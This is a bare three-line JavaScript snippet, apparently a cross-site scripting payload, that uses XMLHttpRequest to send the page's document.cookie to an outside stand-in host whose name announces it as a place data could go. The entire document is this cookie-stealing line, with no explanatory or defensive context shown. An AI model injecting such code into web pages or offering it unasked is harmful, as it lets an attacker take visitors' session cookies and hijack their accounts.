var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'https://some-example-where-data-could-go.com?cookie=' + document.cookie); 
xhr.send();
